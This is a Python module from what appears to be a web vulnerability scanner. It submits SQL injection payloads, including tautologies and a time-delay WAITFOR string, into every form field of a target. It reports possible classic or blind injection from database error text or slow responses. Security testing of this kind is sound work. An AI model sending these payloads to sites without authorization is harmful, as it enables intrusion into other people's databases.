# scanners/sqli.py
import requests
import time

SQLI_PAYLOADS = [
    "' OR '1'='1", "' OR 1=1 --", "\" OR \"1\"=\"1", "'; WAITFOR DELAY '0:0:5' --"
]

def test_sqli(url, forms):
    issues = []
    for form in forms:
        target_url = form["action"]
        data = {}
        for inp in form["inputs"]:
            if inp["name"]:
                for payload in SQLI_PAYLOADS:
                    data[inp["name"]] = payload
                    start = time.time()
                    try:
                        if form["method"] == "post":
                            response = requests.post(target_url, data=data, timeout=10)
                        else:
                            response = requests.get(target_url, params=data, timeout=10)
                        duration = time.time() - start

                        # Detect basic & blind SQLi
                        if any(err in response.text.lower() for err in ["sql", "mysql", "syntax", "odbc", "error"]):
                            issues.append({
                                "vulnerability": "Possible SQL Injection",
                                "url": target_url,
                                "payload": payload,
                                "severity": "High",
                                "description": "Database error message detected"
                            })
                        elif duration > 4:  # timing-based blind SQLi
                            issues.append({
                                "vulnerability": "Possible Blind SQL Injection",
                                "url": target_url,
                                "payload": payload,
                                "severity": "High",
                                "description": "Response delayed, possible blind SQLi"
                            })
                    except requests.RequestException:
                        continue
    return issues
